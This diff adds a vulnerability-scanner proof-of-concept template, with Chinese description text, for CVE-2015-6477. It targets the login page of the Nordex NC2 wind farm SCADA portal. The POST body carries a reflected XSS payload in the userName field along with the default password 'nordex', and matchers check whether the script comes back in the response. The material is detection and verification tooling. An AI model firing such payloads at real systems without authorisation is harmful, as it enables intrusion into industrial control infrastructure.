@@ -1,0 +1,43 @@
+[info]
+author = "ave"
+description = "向 Nordex NC2 SCADA 的 /login 接口发送包含 XSS 载荷的 POST 请求，检测响应中是否反射了注入的脚本代码，验证跨站脚本漏洞是否存在"
+id = "POC-AVE-2015-0050"
+name = "Nordex NC2 Wind Farm Portal 跨站脚本漏洞 PoC"
+severity = "medium"
+tags = ["ave-2015-0050"]
+vuln_id = [
+    "CVE-2015-6477",
+    "AVE-2015-0050",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/login"
+protocol = "http"
+
+[poc.requests.body]
+content = "connection=basic&userName=admin%27%22%29%3B%7D%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&pw=nordex&language=en"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "header"
+type = "word"
+words = ["text/html"]
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["</script><script>alert(document.domain)</script>"]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
